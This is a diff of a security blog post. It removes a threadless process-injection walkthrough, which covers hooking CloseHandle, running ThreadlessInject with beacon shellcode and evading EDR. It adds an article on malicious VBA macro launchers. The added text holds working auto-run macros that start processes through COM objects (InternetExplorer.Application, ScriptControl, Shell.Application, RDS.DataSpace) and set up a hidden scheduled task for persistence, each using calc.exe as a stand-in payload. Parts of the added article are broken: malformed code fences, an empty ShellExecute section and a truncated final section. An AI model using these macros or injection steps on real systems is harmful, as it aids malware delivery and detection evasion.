@@ -13,129 +13,241 @@ image: /assets/img/ThreadLess/threadless.png
 <h1>The Unyielding Threat: Dissecting Advanced VBA Macro Execution Techniques</h1>
 
 The digital threat landscape continues to witness the sophisticated weaponization of VBA macros by advanced adversaries. Despite heightened security controls and widespread awareness campaigns, attackers persistently exploit the deep integration and inherent trust models of Microsoft Office applications to gain initial access. Our analysis moves beyond basic AutoOpen and Document_Open triggers to explore the more obscure, potent launchers being actively deployed in current campaigns. We will deconstruct techniques such as using the InvokeVerbEx method for shell execution and leveraging the RDS.DataSpace object for COM manipulation—methodologies we have consistently observed in operational environments. Working at SCIAT AFRICA has provided definitive evidence of how these methods effectively bypass application hardening and endpoint detection solutions, demonstrating an urgent need for defenders to deepen their understanding of this continuously evolving attack vector.
-- Most classic process injection plays out like this:
-
-- `→ Alloc memory (VirtualAllocEx) → Drop payload (WriteProcessMemory) → Fire it off (CreateRemoteThread)`
-
-- EDRs are all over that combo—trip any one, and you’re flagged or killed.
-
-- But here’s the twist: Threadless Injection skips the obvious. No new thread, no direct execution from the injector. Instead, the payload hijacks execution silently, using the target’s own threads.
-
-- Threadless Injection is a modern process injection method, which eliminates the need for explicitly creating a dedicated execution thread, thereby reducing the number of steps from the three outlined above to just two. In contrast to the classic thread injection, the execution takes place naturally within an already-existing thread context of the target process. 
-
-
-# Preparing for Threadless Process Injection
-
-- Hook the first instruction of a target DLL export to hijack control flow.
-- Extract the return address from the stack and subtract 5 to get the original export address.
-- Save volatile registers to the stack (to restore later).
-- Restore original export bytes (removes the hook).
-- Call injected shellcode right after our hook logic.
-- Once shellcode execution is complete, restore saved registers.
-- Jump back to the original export to maintain normal program behavior.
-
-![Desktop View](/assets/img/ThreadLess/thl.png){: .shadow } 
 
 
 
-## Demo
+# The Art of Macro Execution: Beyond AutoOpen
 
-- First choose a suitable target to inject to ie notepad, teams, remote desktop, etc
-- For us we'll be using remote desktop.
-- Analyze target using tools to identify suitable API to hijack.
+In the evolving landscape of VBA macro security, attackers continue to 
+develop sophisticated techniques to bypass detection and execute their 
+payloads. While traditional methods like `AutoOpen` and `Document_Open` remain prevalent, advanced actors are leveraging COM object hijacking and script control to enhance their tradecraft.
 
-Let's start our analyzes `remote desktop` as our target.
+## Classic COM Object Launching
 
-![Desktop View](/assets/img/ThreadLess/1th.png){: .shadow } 
-_Analzing apis called by Remote Desktop AKA mstsc.exe_
+vb```Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub MyMacro()
+ ' InternetExplorer.Application Technique
+ Dim ie As Object
+ Set ie = CreateObject("InternetExplorer.Application")
+ ie.Navigate "javascript:new ActiveXObject('WScript.Shell').Run('calc.exe')"
+ ' MSXML2.ServerXMLHTTP + WScript.Shell
+ Dim xml As Object, ws As Object
+ Set xml = CreateObject("MSXML2.ServerXMLHTTP")
+ Set ws = CreateObject("WScript.Shell")
+ ws.Run "calc.exe"
+ ' Windows Media Player OCX
+ Dim wmp As Object
+ Set wmp = CreateObject("WMPlayer.OCX")
+ wmp.URL = "file:///c:/windows/system32/calc.exe"
+End Sub```
 
-We Observe that our `mstsc.exe` has been loaded with PID of `6124` and the APIs have loaded.
+This approach demonstrates multiple COM object abuse techniques:
 
-![Desktop View](/assets/img/ThreadLess/2th.png){: .shadow } 
-_mstsc.exe APIs with PID of 6124_
+- **InternetExplorer.Application** leverages JavaScript execution within a browser context
+  
+- **MSXML2.ServerXMLHTTP** combined with WScript.Shell shows layered object creation
+  
+- **WMPlayer.OCX** misuse illustrates how media controls can be weaponized
+  
 
-Going through all these damn Windows APIs trying to find the perfect hook spot had me like:
+## DotNetToJScript Style Execution
 
-<iframe src="https://giphy.com/embed/Sn1m4mcE6mbHwjaWIx" width="480" height="271" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+vb```Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub MyMacro()
+ ' Method 3: DotNetToJScript style COM approach
+ Dim sc As Object
+ Set sc = CreateObject("ScriptControl")
+ sc.Language = "JScript"
+ sc.Eval "new ActiveXObject('WScript.Shell').Run('calc.exe',1,false);"
+End Sub```
 
-- There are so many APIs and all I wanted was one that gets called enough times to slide my shellcode.
+This technique is particularly interesting because it:
 
-- After burning way too many brain cells and coffee, I settled on hooking `CloseHandle`.
+- Uses ScriptControl to create a JScript execution environment
+  
+- Demonstrates cross-language code execution within VBA
+  
+- Shows how .NET concepts can be adapted through COM interfaces
+  
 
-Why?
-- Because it's called a lot. And by "a lot," I mean spam-level frequency in most apps.
+## InvokeVerbEx and RDS.DataSpace Techniques
 
-- But let's be honest—this isn’t the most elegant or stealthy option. It works, sure, but it’s noisy. You’re basically piggybacking on Windows cleanup ops.
+In our continued exploration of sophisticated VBA macro execution 
+techniques, we now examine two particularly interesting methods that 
+leverage Windows Shell components and remote data services to bypass 
+security controls.
 
-- So yeah, I went full `CloseHandle` gang for my threadless injection. Not perfect, but it gets the payload through the door... for now.
+## InvokeVerbEx: File Association Abuse
 
-> If you want to be more surgical (and stealthy), consider hooking APIs like:`CryptProtectMemory & CryptUnprotectMemory`  
+vb```Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub MyMacro()
+ Dim objShell As Object
+ Dim objFolder As Object
+ Dim objFolderItem As Object```
+
+```vb
+Set objShell = CreateObject("Shell.Application")
+Set objFolder = objShell.NameSpace("C:\Windows\System32\")
+Set objFolderItem = objFolder.ParseName("calc.exe")
+
+If Not objFolderItem Is Nothing Then
+    objFolderItem.InvokeVerbEx "open"
+End If
+```
+
+End Sub```
+
+This technique demonstrates file association hijacking through Shell.Application:
+
+- **Shell Namespace Browsing**: Accesses the System32 directory through COM
+  
+- **File Parsing**: Locates the target executable using ParseName
+  
+- **Verb Invocation**: Uses InvokeVerbEx with the "open" verb to launch the application
+  
+
+## ShellExecute: Direct Process Creation
+
+vb
+
+A more direct approach using ShellExecute:
+
+- **Direct Execution**: Bypasses file parsing by directly calling ShellExecute
+  
+- **Window Management**: The final parameter controls window visibility
+  
+- **Minimal Footprint**: Fewer COM interactions than the InvokeVerbEx method
+  
+
+## RDS.DataSpace: COM Factory Abuse
+
+vb
+
+`Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub MyMacro()
+ Dim rds As Object
+ On Error Resume Next
+ Set rds = CreateObject("RDS.DataSpace")
+ If Err.Number = 0 Then
+ Dim factory As Object
+ Set factory = rds.CreateObject("WScript.Shell", "")
+ factory.Run "calc.exe", 1, False
+ End If
+ On Error GoTo 0
+End Sub`
+
+This method represents a significant escalation in technique sophistication:
+
+- **RDS.DataSpace Object**: Originally designed for remote data access, now weaponized
+  
+- **Object Factory Pattern**: Creates objects through a factory interface
+  
+- **Error Handling**: Includes defensive programming to handle potential failures
+  
+
+## Scheduled Task Persistence: The Stealthy VBA Execution Method
+
+In
+ the ever-evolving arsenal of VBA macro techniques, attackers have 
+developed increasingly sophisticated methods to maintain persistence and
+ evade detection. One particularly effective approach involves 
+leveraging the Windows Task Scheduler through macros, creating a 
+powerful persistence mechanism that survives reboots and application 
+closures.
+
+### Scheduled Task Deployment via VBA
+
+vb
+
+`Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub MyMacro()
+ Dim ws As Object
+ Set ws = CreateObject("WScript.Shell")
+ ws.Run "schtasks /create /tn ""TestTask"" /tr ""calc.exe"" /sc once /st 00:00", 0, True
+ ws.Run "schtasks /run /tn ""TestTask""", 0, False
+End Sub`
+
+### Technical Breakdown
+
+This technique demonstrates a two-stage approach to execution:
+
+**Stage 1: Task Creation**
+
+- Uses `schtasks /create` to establish a scheduled task named "TestTask"
+  
+- Configures the task to run `calc.exe` as a demonstration payload
+  
+- Sets execution for a specific time with `/sc once /st 00:00`
+  
+- The `0` parameter ensures the command window remains hidden
+  
+- `True` parameter waits for command completion before proceeding
+  
+
+**Stage 2: Immediate Execution**
+
+- Uses `schtasks /run` to trigger the task immediately
+  
+- The `False` parameter allows the macro to continue without waiting
+  
+- Creates separation between the macro and the final payload execution
+  
+
+### Why This Method is Effective
+
+From our observations at SCIAT AFRICA, scheduled task abuse provides several advantages for attackers:
+
+**Persistence Benefits:**
+
+- **Reboot Survival**: Tasks persist through system restarts
+  
+- **Application Independence**: Execution continues after Office applications close
+  
+- **Legitimate Appearance**: Scheduled tasks are common in enterprise environments
+  
+- **Timing Flexibility**: Can be configured for immediate or delayed execution
+  
+
+**Evasion Advantages:**
+
+- **Process Separation**: Decouples the macro from the final payload
+  
+- **Reduced Suspicion**: Task Scheduler is a trusted Windows component
+  
+- **Minimal Memory Footprint**: The macro itself contains no malicious code
+  
+
+### Advanced Attack Scenarios
+
+More sophisticated attackers enhance this technique with additional features:
+
+vb
+
+> Stay tuned for Part 2, where we'll dive into even more clever ways macros get the job done!
+
 {: .prompt-tip }
-
-> Avoid frequent or noisy API calls that may overwhelm the beacon or shellcode. Excessive calls can lead to detection, instability, or unintended behavior in the target process.
-{: .prompt-danger }
-
-## Using ThreadlessInject by CCob
-
-We'll be using the **ThreadlessInject** tool developed by [CCob](https://github.com/CCob). You can find the repository here:  
-🔗 [https://github.com/CCob/ThreadlessInject](https://github.com/CCob/ThreadlessInject)
-
-To get started:
-
-1. **Clone the repository**:
-    ```bash
-    git clone https://github.com/CCob/ThreadlessInject.git
-    ```
-2. **Build the tool using Visual Studio to generate:** `ThreadlessInject.exe.`
-
-3. **Once compiled, you can view the available options by running:**
-    ```bash
-    ThreadlessInject.exe -h
-    ```
-
-![Desktop View](/assets/img/ThreadLess/3th.png){: .shadow } 
-_ThreadlessInject Options_
-
-## ThreadlessInject -> Remote Desktop Connection(mstsc.exe)
-
-- We'll be injecting shellcode into **notepad.exe**, targeting the `CloseHandle` export function.  
-
-- This function resides in **kernelbase.dll** and will serve as our hijack point for threadless execution.
-
-![Desktop View](/assets/img/ThreadLess/4th.png){: .shadow } 
-_Lazy Mans choice -> CloseHandle_
-
-
-- Next is to prepare our shellcode.For demo purposes will be using `notepad.bin` shellcode replace this with your beacon shellcode.
-
-| Option            | Description                                                                 |
-|-------------------|-----------------------------------------------------------------------------|
-| `-p, --pid=VALUE`  | Target process ID to inject the shellcode into. Typically, this is the PID of the process you want to hijack (e.g., notepad.exe). |
-| `-d, --dll=VALUE`  | The name of the DLL that contains the export to be patched. This must be a `KnownDll`, such as `kernelbase.dll`. |
-| `-e, --export=VALUE` | The specific exported function within the DLL that will be hijacked (e.g., `CryptProtectMemory`). |
-
-![Desktop View](/assets/img/ThreadLess/4th.png){: .shadow } 
-_CommandLine Setting-> Running ThreadLessInject_
-
-> Executing...
-{: .prompt-danger }
-
-- Voilà! Notepad popped up—successfully triggered after our shellcode executed. It appeared moments after interacting with the Remote Desktop window, such as minimizing or switching focus.
-
-
-
-{%
-  include embed/video.html
-  src='/assets/img/ThreadLess/7.mp4'
-  types='mov'
-  title='Demo video'
-  autoplay=true
-  loop=true
-  muted=true
-%}
-
-
-
-
-> Threadless injection provides a low-noise method for code execution by avoiding the creation of new threads and instead hijacking existing exported functions within known DLLs. This technique can help bypass conventional detection mechanisms that monitor thread creation or common injection patterns. By leveraging tools like ThreadlessInject and selecting frequently invoked APIs such as CryptProtectMemory, attackers can achieve code execution with reduced visibility. Proper testing in realistic environments remains essential to ensure effectiveness and evade modern security solutions.
-{: .prompt-info }
